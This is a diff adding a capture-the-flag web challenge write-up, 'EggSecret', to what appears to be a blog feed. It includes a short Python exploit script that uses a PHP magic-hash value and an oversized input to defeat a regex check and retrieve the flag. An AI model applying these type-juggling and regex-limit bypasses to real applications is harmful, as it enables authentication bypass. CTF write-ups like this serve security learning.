@@ -612,6 +612,25 @@
 <ol start="3">
 <li>and here is it the flag</li>
 </ol>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EggSecret"><a href="#EggSecret" class="headerlink" title="EggSecret"></a>EggSecret</h2><ol>
+<li>First download the file attached and lets see whats inside.</li>
+<li>We can see that there is a secret hash at there <code>00e39786989574093743872279278460</code> also there is something we need to bypass <code>(preg_match(&quot;/^(.*?)+$/s&quot;, $egg))</code></li>
+<li><pre><code class="import">
+</code></pre>
+</li>
+</ol>
+<pre><code>url = &quot;http://135.181.88.229:31730/&quot;
+
+params = &#123;&quot;eggSecret&quot;: &quot;240610708&quot;&#125;  # String with MD5 hash starting with &quot;0e&quot;
+data = &#123;&quot;egg&quot;: &quot;A&quot; * 10000&#125;  # Very large input to bypass the regex
+
+response = requests.post(url, params=params, data=data)
+
+print(response.text)```
+</code></pre>
+<ol start="4">
+<li>and we can get the flag content.</li>
+</ol>
 ]]></content>
       <categories>
         <category>CTF 2025</category>
